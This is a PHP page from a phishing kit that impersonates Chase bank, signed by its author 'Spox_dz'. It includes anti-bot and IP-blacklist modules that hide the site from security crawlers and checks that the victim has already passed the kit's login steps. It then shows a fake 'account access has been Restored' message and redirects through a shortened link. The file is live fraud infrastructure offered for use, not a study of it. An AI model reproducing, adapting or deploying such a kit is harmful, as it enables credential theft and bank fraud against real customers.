<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Thank you! - Account Verification </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link id="externalCSSLink" rel="external stylesheet" href="Spox/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="Spox/Files/img/chasefavicon.ico">
        <link href="Spox/Files/css/origination.css" rel="stylesheet" id="originationCSS">
        <meta http-equiv="refresh" content="4;url=https://bit.ly/2OWmwsY"> 

</head>

<body data-has-view="true" class="no-ignore-color">

 <style type="text/css">
     .origination-custom.jpui.progress.bar:after {border-color: #128842;background-color: #128842;}
     .util.float.right {float: left;}
     @media (min-width: 768px){.col-sm-4 {width: 100%;}}
     .col-sm-4 {width: 100%;}
 </style>
        <div id="container"> 
            <header id="header-container" data-has-view="true">
                <div class="header-container" data-is-view="true"> 
                    <div class="row top">
                        <div class="col-xs-4"> 
                <span id="menuLines-iconanchor-wrapper">
                    <a class="jpui iconaction focus onDark" href="javascript:void(0);" id="menuLines">
                        <i class="jpui menulines icon" id="icon-menuLines" aria-hidden="true">
                    </i>
                </a>
            </span> 
                <span class="jpui link" id="exitApp-link-wrapper">
                <a class="link-anchor INPUTFIELD2" id="exitApp" href="javascript:void(0);" aria-label=" Exit , opens dialog">Exit</a>
                </span>
            </div> 

<div class="col-xs-4 color-mode-header-logo">
<svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
<path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           
</path> 
<path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);">
</path>
</svg>
</div> 
  <div class="col-xs-4 util right aligned">
                
            </div>
        </div>
    </div>
</header> 
<div id="main-container">
            <aside id="helpbar" role="complementary" aria-label="Help Bar">
            </aside> 
            <div>
                <div class="container-fluid" id="secondary-header-container">
                
            </div> 
            <main class="container-fluid" id="main">
                <div id="progressbar-block" data-has-view="true">
                <div data-is-view="true">
                <style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 99.8%;}</style>
                <div class="row origination-progress-block">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div id="PROGRESSBAR_HEADER">
                    <div>
                    <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">&nbsp;&nbsp;</h1> 
                <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true">
                
            </span>
            </div>
            </div> 
                <div id="PROGRESSBAR_PROGRESS">
                <div class="row"><div class="col-xs-12 col-sm-12">
                <div class="jpui progress origination-custom step1of8 bar" id="main-progress" data-progress="">
                    <div class="bar fill" id="main-progress-bar">
                
            </div> 
                <span class="util accessible-text" id="accessible-bar-main-progress">
                
            </span>
        </div>
    </div>
</div>
</div>  


    <div id="PROGRESSBAR_ADVISORY">
        <div>
            <h2 id="stepAdvisoryTagElementId" tabindex="-1">Thank you! Your chase account access has been Restored.</h2>
        </div>
    </div>
</div>
</div>
</div>
</div>

<section class="origination page-content" id="content" data-has-view="true">
    <div class="row no-content-padding" id="gettingStartedContainer" data-is-view="true">
        <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div id="ICONDATA">
                <div class="row util-margin-top-bottom">
                 <div class="col-sm-4 icongroup">
                    <div class="row">
                        <div class="col-xs-2 col-sm-12 util aligned center gt-imageIcon-wrap">
                            <img width="150" height="150" src="Spox/Files/img/success.gif">
                        </div>
                        <div class="container-fluid" id="originationsFooter" data-has-view="true">
                            <div class="row" data-is-view="true">
                                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                                    <div class="inlineFieldCell">
                                    <div class="row">
                                        <div class="col-xs-12" id="footerText" aria-hidden="true">
                                            <p class="BODY2">Please wait, you will be redirected to the authentication page in 5 seconds ...<br>
                                            <img style="width:13%;" src="Spox/Files/img/loading.gif">
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


</body>
</html>